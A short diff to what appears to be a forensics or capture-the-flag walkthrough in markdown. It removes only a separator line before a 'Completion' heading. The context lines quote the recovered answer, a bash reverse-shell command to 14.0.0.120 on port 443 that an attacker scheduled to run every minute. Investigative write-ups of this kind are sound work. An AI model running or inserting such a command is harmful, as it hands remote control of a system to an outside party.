@@ -165,7 +165,6 @@ The attacker here is setting a reverse shell to run every minute on the machine.
 
 **Answer:** `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`
 
----
 # Completion
 
 ![](images/image-629.webp)
